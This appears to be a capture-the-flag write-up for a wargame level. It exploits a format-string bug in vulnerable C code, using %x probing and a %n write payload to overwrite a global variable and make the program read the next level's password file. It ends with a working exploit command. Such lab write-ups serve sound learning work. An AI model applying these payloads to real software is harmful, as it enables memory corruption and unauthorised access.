# Level 4

Same process situation as before, except that now the printf is in another function and the value to set is **16930116**. And this time, he will directly print the result in the console, no shell.

```c
void p(char *format) {
  printf(format);
}

int m;

void n(void) {
  char buffer[520];
  
  fgets(buffer, 512, stdin);
  p(buffer);
  if (m == 16930116) {
    system("/bin/cat /home/user/level5/.pass");
  }
}
```

We the same method as before, the address of the variable "m" is **0x8049810**.

First we found the position of the buffer (AAAA is 41414141) and like before, accessing it make the program segfault.
```sh
$ ./level4 <<< $(python -c 'print "AAAA" + ".%08x" * 12')
AAAAA.b7ff26b0.bffff794.b7fd0ff4.00000000.00000000.bffff758.0804848d.bffff550.00000200.b7fd1ac0.b7ff37d0.41414141

$ ./level4 <<< $(python -c 'print "AAAAA" + "%12$s"')
Segmentation fault (core dumped)
```

Now let's edit the memory to set "m" to 16930116.
```sh
(gdb) run <<< $(python -c 'print("\x10\x98\x04\x08" + "%12$n")')
(gdb) x/d 0x8049810
0x8049810 <m>:  4
...
(gdb) run <<< $(python -c 'print("\x10\x98\x04\x08" + "%50x%12$n")')
(gdb) x/d 0x8049810
0x8049810 <m>:  54
...
(gdb) run <<< $(python -c 'print("\x10\x98\x04\x08" + "%16930112x%12$n")')
(gdb) x/d 0x8049810
0x8049810 <m>:  16930116
(gdb) c
Continuing.
/bin/cat: /home/user/level5/.pass: Permission denied
```

We are now entering in the condition executing the command and our final command will be:
```sh
$ python -c 'print("\x10\x98\x04\x08" + "%16930112x%12$n")' | ./level4
```

[Hacking - The Art of exploitation](https://www.amazon.fr/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441)